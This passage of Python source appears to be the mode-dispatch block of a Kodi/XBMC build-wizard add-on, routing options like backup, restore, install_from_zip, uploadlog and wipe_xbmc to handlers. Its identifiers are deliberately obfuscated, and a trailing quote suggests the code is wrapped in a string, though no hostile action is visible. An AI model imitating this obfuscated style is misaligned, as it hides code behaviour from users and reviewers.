elif iI1iII111ii1I == 'addon_final_menu' : OOO0000oO ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'addon_categories' : o0OOOoO0 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'addon_countries' : i1iI ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'addon_genres' : I1iIi1iiiIiI ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'addon_install' : iI11IIiIiIii1 ( oOo00O0oo00o0 , IiIiIiiii , II1i111i11i1i , Ii1i1i1i1I1Ii , I1iii11 , ooo0O , OOoo , Ii1iii11i1ii1 )
elif iI1iII111ii1I == 'addon_install_badzip' : oo0O ( oOo00O0oo00o0 , IiIiIiiii , II1i111i11i1i , Ii1i1i1i1I1Ii , I1iii11 , ooo0O , OOoo , Ii1iii11i1ii1 )
elif iI1iII111ii1I == 'addon_install_na' : i1iI1IIi11i1II ( oOo00O0oo00o0 , IiIiIiiii , II1i111i11i1i , Ii1i1i1i1I1Ii , I1iii11 , ooo0O , OOoo , Ii1iii11i1ii1 )
elif iI1iII111ii1I == 'addon_install_zero' : II1i1III ( oOo00O0oo00o0 , IiIiIiiii , II1i111i11i1i , Ii1i1i1i1I1Ii , I1iii11 , ooo0O , OOoo , Ii1iii11i1ii1 )
elif iI1iII111ii1I == 'addon_loop' : oOo0Oo0O0O ( )
elif iI1iII111ii1I == 'addon_removal_menu' : OO0Ooo0 ( )
elif iI1iII111ii1I == 'addonmenu' : I1iiIII ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'addon_settings' : III1I1I ( )
elif iI1iII111ii1I == 'advanced_tools' : iii111III1ii1 ( )
elif iI1iII111ii1I == 'backup' : BACKUP ( )
elif iI1iII111ii1I == 'backup_option' : oo0O0o ( )
elif iI1iII111ii1I == 'backup_restore' : IiIi1i ( )
elif iI1iII111ii1I == 'browse_repos' : IIiI1111i1 ( )
elif iI1iII111ii1I == 'cb_test_loop' : oOo0Oo0O0O ( )
elif iI1iII111ii1I == 'CB_Menu' : iI1iiiIii1II1 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'check_storage' : checkPath . check ( oOO0o )
elif iI1iII111ii1I == 'check_updates' : II1IIIIiII1i ( )
elif iI1iII111ii1I == 'clear_cache' : III1ii ( )
elif iI1iII111ii1I == 'create_keyword' : oo0OOoooo0O0 ( )
elif iI1iII111ii1I == 'community' : i1iIIII1iiIIi ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'community_backup' : iI1iIIIIIiIi1 ( )
elif iI1iII111ii1I == 'community_backup_2' : OO0I1iiI1iiI1i1 ( )
elif iI1iII111ii1I == 'community_menu' : iIIi111IiII1i ( o0OoIiiiiiiI111i , OoiIIiIi1 )
elif iI1iII111ii1I == 'countries' : iiIIIIiI111 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'description' : II1i ( oOo00O0oo00o0 , o0OoIiiiiiiI111i , IiII1i11III , ii1i1II , iII1iii , IiIi11Iii , oOOo0oo0O , IIi1i1I11IIII , OooOoOOO00O , I111iIIII11iI , oOoOO , i11I1iIii1i11 , iIiiI11II11i , o00OoO0o0 )
elif iI1iII111ii1I == 'delete_path' : IIII1i ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'delete_profile' : iI1I1I ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'fix_special' : I1iII1IIi1IiI ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'full_backup' : iIIi1iii1 ( )
elif iI1iII111ii1I == 'full_clean' : o0Oo0oO00Oooo ( )
elif iI1iII111ii1I == 'genres' : oOooooO ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'gotham' : O0oooooO ( )
elif iI1iII111ii1I == 'grab_addons' : oO00O0o0oOOO ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'grab_builds' : I1Io0OO ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'grab_builds_premium' : Grab_Builds_Premium ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'grab_hardware' : III1I11II11I ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'grab_news' : OOO0ooO0Oo0 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'grab_tutorials' : Oo0OO0 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'grab_updates' : i1II111ii1ii ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'guisettingsfix' : IIIii111i ( o0OoIiiiiiiI111i , ooO00 )
elif iI1iII111ii1I == 'hardware_filter_menu' : OO00O0O ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'hardware_final_menu' : o0o0O0o0O ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'hardware_root_menu' : I1IIiIIiiI1i ( )
elif iI1iII111ii1I == 'helix' : oo0OO0O0o0O ( )
elif iI1iII111ii1I == 'hide_passwords' : IIIIIiiI ( )
elif iI1iII111ii1I == 'ipcheck' : Oo00Oo00Oooo ( )
elif iI1iII111ii1I == 'install_venz' : oooO0O0o00o ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'install_venz_menu' : i11I1Ii1Iiii1 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'install_content' : oOoOoo0 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'install_menu' : I1Io0Oo00 ( )
elif iI1iII111ii1I == 'install_from_zip' : oO00O0oO ( )
elif iI1iII111ii1I == 'instructions' : I1i1 ( )
elif iI1iII111ii1I == 'instructions_1' : OO0OO0 ( )
elif iI1iII111ii1I == 'instructions_2' : I1iI11ii ( )
elif iI1iII111ii1I == 'instructions_3' : ii1Ii ( )
elif iI1iII111ii1I == 'instructions_4' : i1iII11I1I1I ( )
elif iI1iII111ii1I == 'instructions_5' : II11111I ( )
elif iI1iII111ii1I == 'instructions_6' : Instructions_6 ( )
elif iI1iII111ii1I == 'keywords' : i11IIiiI ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'kill_xbmc' : OOo00O0O ( )
elif iI1iII111ii1I == 'kodi_settings' : i11IIii ( )
elif iI1iII111ii1I == 'local_backup' : i1IiI1iiIII1 ( )
elif iI1iII111ii1I == 'LocalGUIDialog' : I1II11Ii11iI1 ( )
elif iI1iII111ii1I == 'log' : oOoooOOO0 ( )
elif iI1iII111ii1I == 'login_check' : I11ooOo ( )
elif iI1iII111ii1I == 'manual_search' : OOoo000OO00 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'manual_search_builds' : Manual_Search_Builds ( )
elif iI1iII111ii1I == 'nan_menu' : NaN_Menu ( )
elif iI1iII111ii1I == 'news_root_menu' : iiiiiiI ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'news_menu' : I11iIIiiIiIi ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'notify_msg' : Notify_Check ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'open_system_info' : OoO0 ( )
elif iI1iII111ii1I == 'open_filemanager' : o0oOo ( )
elif iI1iII111ii1I == 'openelec_backup' : OOOo00o ( )
elif iI1iII111ii1I == 'openelec_settings' : Ooo00 ( )
elif iI1iII111ii1I == 'openlink' : O0O0OOo00Oo ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'play_video' : yt . PlayVideo ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'platform_menu' : OoO0OOOOO ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'pop' : i1I1IiI1ii ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'register' : Register ( )
elif iI1iII111ii1I == 'remove_addon_data' : ooOiiIII ( )
elif iI1iII111ii1I == 'remove_addons' : ooo0 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'remove_build' : o00O00O0O0 ( )
elif iI1iII111ii1I == 'remove_crash_logs' : IIII1iIii1Ii ( )
elif iI1iII111ii1I == 'remove_packages' : oOo0iiii11i1 ( )
elif iI1iII111ii1I == 'remove_textures' : OOOoOooO000oO ( )
elif iI1iII111ii1I == 'restore' : RESTORE ( )
elif iI1iII111ii1I == 'restore_backup' : ooO0oO00oO0o ( oOo00O0oo00o0 , o0OoIiiiiiiI111i , IiIi11Iii )
elif iI1iII111ii1I == 'restore_community' : oOo000O00O ( oOo00O0oo00o0 , o0OoIiiiiiiI111i , OoiIIiIi1 , IiIi11Iii , IIi1i1I11IIII , o0OOOoO0ooOOOo0 , O0000 )
elif iI1iII111ii1I == 'restore_local_CB' : iiOO0O ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'restore_local_gui' : oO0Oooo ( )
elif iI1iII111ii1I == 'restore_local_OE' : OoOOOO0 ( )
elif iI1iII111ii1I == 'restore_openelec' : oOoOoO0OoOO0 ( oOo00O0oo00o0 , o0OoIiiiiiiI111i , OoiIIiIi1 )
elif iI1iII111ii1I == 'restore_option' : oo0O0oO0o ( )
elif iI1iII111ii1I == 'restore_zip' : oo0Ooo ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'run_addon' : IIIi1IiI ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'runtest' : speedtest . runtest ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'search_addons' : i1111ii1 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'search_builds' : i1II1Ii ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'search_content' : OoOOOoo ( )
elif iI1iII111ii1I == 'Search_Private' : Private_Search ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'showinfo' : OO00O ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'showinfo2' : ooOOooooo0Oo ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'social_menu' : oOOO0o00 ( )
elif iI1iII111ii1I == 'SortBy' : II1I11 ( BuildURL , type )
elif iI1iII111ii1I == 'speed_instructions' : o0Ooo0 ( )
elif iI1iII111ii1I == 'speedtest_menu' : ii1oO0Oo ( )
elif iI1iII111ii1I == 'testoff' : iIIIi1Iii1 ( )
elif iI1iII111ii1I == 'switch_profile_menu' : iI1II1iiI11iI ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'switch_profile' : OOoooOOO0 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'text_guide' : ooOOoo0 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'tools' : II1I1 ( )
elif iI1iII111ii1I == 'tutorial_final_menu' : Iii1ii ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'tutorial_addon_menu' : Oo0o0o0o ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'tutorial_root_menu' : I1iII1IiI11i ( )
elif iI1iII111ii1I == 'unhide_passwords' : ii1iiiIIiIII ( )
elif iI1iII111ii1I == 'update' : i1II1 ( )
elif iI1iII111ii1I == 'update_community' : oOo000oOo ( oOo00O0oo00o0 , o0OoIiiiiiiI111i , OoiIIiIi1 , IiIi11Iii , IIi1i1I11IIII , o0OOOoO0ooOOOo0 , O0000 )
elif iI1iII111ii1I == 'uploadlog' : OoOO ( )
elif iI1iII111ii1I == 'user_info' : Show_User_Info ( )
elif iI1iII111ii1I == 'xbmc_menu' : oOOOoO00OOooOOOoO ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'xbmcversion' : iII11i1 ( o0OoIiiiiiiI111i )
elif iI1iII111ii1I == 'wipe_xbmc' : oOOo0OO0oo ( iI1iII111ii1I )
xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
')